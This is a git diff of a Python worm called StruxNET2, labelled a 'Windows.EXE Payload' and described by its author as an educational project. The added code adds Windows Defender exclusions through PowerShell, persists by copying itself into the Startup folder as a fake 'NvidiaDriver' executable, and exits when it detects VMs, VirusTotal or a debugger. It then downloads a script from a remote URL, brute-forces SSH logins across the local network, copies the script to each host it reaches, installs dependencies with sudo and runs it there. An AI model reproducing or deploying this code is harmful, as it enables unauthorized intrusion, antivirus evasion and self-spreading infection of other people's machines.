@@ -1,12 +1,14 @@
 # before we start: I Made this Project for education and to suprise my Professors (I "study" it so not in the bad way lol)
 # Just be carefull and yea. Credits: I used snippets from malware_showcase by PatrikH0lop and overwork them a little bit
 
-# Version 1.0
+# Version 1.1
 # Copyright: WeepingAngel
+# This is the Windows.EXE Payload
 
 
 import os
 import sys
+from idlelib.run import exit_now
 from importlib.metadata import requires
 from ipaddress import ip_address
 import subprocess
@@ -15,70 +17,78 @@ import paramiko
 import re
 import socket
 import platform
-from pycparser.c_ast import Return
+import shutil
 import urllib.request
+import uuid
+import ctypes
 
 
-
-
-class syscalls:
-    def downloadLinuxPayload(repo_owner, repo_name, file_path, save_as):
-        github_url = f"https://raw.githubusercontent.com/{repo_owner}/{repo_name}/main/{file_path}"
+class WinSploit:
+    def DefenderBypass(self, exe_path):
         try:
-            print(f"Lade Datei herunter von {github_url}...")
-            urllib.request.urlretrieve(github_url, save_as)
-            print(f"Datei erfolgreich heruntergeladen und gespeichert als {save_as}")
+            exe_path2 = os.path.abspath(sys.argv[0])
+            ps_command = f"Add-MpPreference -ExclusionPath '{exe_path}'"
+            ps_command2 = f"Add-MpPreference -ExclusionPath '{exe_path2}'"
+            result = subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
+            result2 = subprocess.run(["powershell", "-Command", ps_command2], capture_output=True, text=True)
+            if result.returncode == 0:
+                return f"Erfolgreich zur Ausnahme hinzugefügt: {exe_path}"
+            elif result2.returncode == 0:
+                return None
+            else:
+                return f"Hinzufügen zur Ausnahme fehlgeschlagen: {result.stderr.strip()}"
         except Exception as e:
-            print(f"Fehler beim Herunterladen der Datei: {e}")
-    def detect_os_and_package_manager(self):
-        current_os = platform.system()
-        python_installed = False
-        python_version = None
+            return f"Ein Fehler ist aufgetreten: {e}"
 
-        if current_os == "Windows":
-            try:
-                subprocess.run(["winget", "--version"], check=True, stdout=subprocess.DEVNULL,
-                               stderr=subprocess.DEVNULL)
-                package_manager = "winget"
-            except (subprocess.CalledProcessError, FileNotFoundError):
-                package_manager = None
 
-            try:
-                result = subprocess.run(["python", "--version"], check=True, stdout=subprocess.PIPE,
-                                        stderr=subprocess.PIPE)
-                python_installed = True
-                python_version = result.stdout.decode().strip()
-            except (subprocess.CalledProcessError, FileNotFoundError):
-                python_installed = False
+    def autostart(self):
+        try:
+            exe_path = os.path.abspath(sys.argv[0])
+            autostart_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+            random_name = f"NvidiaDriver_{uuid.uuid4()}.exe"
+            destination_path = os.path.join(autostart_folder, random_name)
+            shutil.copyfile(exe_path, destination_path)
+            bypass_result = self.DefenderBypass(destination_path)
+        except Exception as e:
+            return f"Ein Fehler ist aufgetreten: {e}"
 
-            return current_os, package_manager, python_installed, python_version
+    def BypassVM(self): # Try to detect if system is running in a virtual debugging env
+        if platform.system() == "Windows":
+            try: # Virtual maschine detection
+                output = subprocess.check_output("systeminfo", shell=True).decode()
+                if "VMware" in output:
+                    sys.exit(1)
+                elif "VirtualBox" in output:
+                    sys.exit(1)
+            except Exception as e:
+                pass
+            try: # BIOS Detection
+                with open('/sys/class/dmi/id/bios_version', 'r') as f:
+                    bios_info = f.read().strip()
+                    if "virtual" in bios_info.lower() or "vmware" in bios_info.lower() or "virtualbox" in bios_info.lower():
+                        sys.exit(1)
+                    else:
+                        pass
+            except Exception as e:
+                pass
+            if os.getenv('VT'): # VirusTotal Detection
+                sys.exit(1)
+            else:
+                pass
+            return "No VM detected"
 
-        elif current_os == "Linux":
-            package_manager = None
-
-            if os.path.exists('/usr/bin/apt'):
-                package_manager = 'apt'
-            elif os.path.exists('/usr/bin/yum'):
-                package_manager = 'yum'
-            elif os.path.exists('/usr/bin/dnf'):
-                package_manager = 'dnf'
-            elif os.path.exists('/usr/bin/pacman'):
-                package_manager = 'pacman'
-            elif os.path.exists('/usr/bin/zypper'):
-                package_manager = 'zypper'
-
-            try:
-                result = subprocess.run(["python3", "--version"], check=True, stdout=subprocess.PIPE,
-                                        stderr=subprocess.PIPE)
-                python_installed = True
-                python_version = result.stdout.decode().strip()
-            except (subprocess.CalledProcessError, FileNotFoundError):
-                python_installed = False
-
-            return current_os, package_manager, python_installed, python_version
+    def AntiDebugging(self):
+        if 'pydevd' in sys.modules or 'pdb' in sys.modules:
+            return True
         else:
-            return "Invalid OS", None, False, None
-
+            pass
+        if os.name == 'nt':
+            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+            debugged = kernel32.IsDebuggerPresent()
+            sys.exit(1)
+        else:
+            pass
+        return False
 
 
 class Spreader:
@@ -158,46 +168,65 @@ class Spreader:
     def spreading_mashine(self):
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        script_url = "https://raw.githubusercontent.com/Crafttino21/StruxNET2/refs/heads/main/StruxNET2-Linux.py"
+        local_program_files = os.environ.get('ProgramFiles', 'C:\\Program Files')
+        local_script_path = os.path.join(local_program_files, "StruxNET2-Linux.py")
+        try:
+            urllib.request.urlretrieve(script_url, local_script_path)
+        except Exception as e:
+            return e
 
         for remote_address in self.generate_adresses_on_network():
             for user, passw in self.thenest:
                 try:
                     ssh.connect(remote_address, port=22, username=user, password=passw, timeout=10)
-
                     with scp.SCPClient(ssh.get_transport()) as scp_client:
                         try:
-                            script_path = sys.argv[0]
-                            remote_path = f"/tmp/{os.path.basename(script_path)}"
-                            scp_client.put(script_path, remote_path)
-                            os_type, package_manager, python_installed, python_version = syscalls.detect_os_and_package_manager()
-                            if os_type == "Windows":
-                                if not python_installed:
-                                    ssh.exec_command("winget install Python.Python")
-                            elif os_type == "Linux":
+                            remote_script_path = f"/tmp/{os.path.basename(local_script_path)}"
+                            scp_client.put(local_script_path, remote_script_path)
+                            stdin, stdout, stderr = ssh.exec_command("uname -s")
+                            os_type = stdout.read().decode().strip()
+                            if os_type == "Linux":
+                                # Prüfen, welcher Paketmanager installiert ist
+                                stdin, stdout, stderr = ssh.exec_command("""
+                                    if [ -x "$(command -v apt)" ]; then
+                                        echo apt;
+                                    elif [ -x "$(command -v yum)" ]; then
+                                        echo yum;
+                                    elif [ -x "$(command -v dnf)" ]; then
+                                        echo dnf;
+                                    elif [ -x "$(command -v pacman)" ]; then
+                                        echo pacman;
+                                    elif [ -x "$(command -v zypper)" ]; then
+                                        echo zypper;
+                                    else
+                                        echo unknown;
+                                    fi
+                                """)
+                                package_manager = stdout.read().decode().strip()
+                                stdin, stdout, stderr = ssh.exec_command("python3 --version")
+                                python_installed = stdout.read().decode().strip()
                                 if not python_installed:
                                     if package_manager == "apt":
-                                        ssh.exec_command("sudo apt update && sudo apt install -y python3")
-                                        ssh.exec_command("sudo apt update && sudo apt install -y python3-pip")
+                                        ssh.exec_command("sudo apt update && sudo apt install -y python3 python3-pip")
                                     elif package_manager == "yum":
-                                        ssh.exec_command("sudo yum install -y python3")
-                                        ssh.exec_command("sudo yum install -y python3-pip")
+                                        ssh.exec_command("sudo yum install -y python3 python3-pip")
                                     elif package_manager == "dnf":
-                                        ssh.exec_command("sudo dnf install -y python3")
-                                        ssh.exec_command("sudo dnf install -y python3-pip")
+                                        ssh.exec_command("sudo dnf install -y python3 python3-pip")
                                     elif package_manager == "pacman":
-                                        ssh.exec_command("sudo pacman -Syu python")
-                                        ssh.exec_command("sudo pacman -Syu python3-pip")
+                                        ssh.exec_command("sudo pacman -Syu python python3-pip")
                                     elif package_manager == "zypper":
-                                        ssh.exec_command("sudo zypper install -y python3")
-                                        ssh.exec_command("sudo zypper install -y python3-pip")
-                            stdin, stdout, stderr = ssh.exec_command("pip3 install scp paramiko")
-                            stdin, stdout, stderr = ssh.exec_command(f"python3 {remote_path}")
-                            print(stdout.read().decode())
-                            print(stderr.read().decode())
+                                        ssh.exec_command("sudo zypper install -y python3 python3-pip")
+                                    else:
+                                        continue
+                            stdin, stdout, stderr = ssh.exec_command(f"pip3 install scp paramiko requests")
+                            stdin, stdout, stderr = ssh.exec_command(f"python3 {remote_script_path}")
+
                         except Exception as e:
-                            return None
+                            continue
                 except Exception as e:
-                    return None
+                    continue
+
         ssh.close()
 
     def get_local_ip(ip):
@@ -214,6 +243,8 @@ class Spreader:
 
 
 if __name__ == '__main__':
-    syscalls.detect_os_and_package_manager()
+    win_sploit = WinSploit()
+    win_sploit.autostart()
+    win_sploit.DefenderBypass()
     ip = Spreader.get_local_ip()
     spread = Spreader(ip)
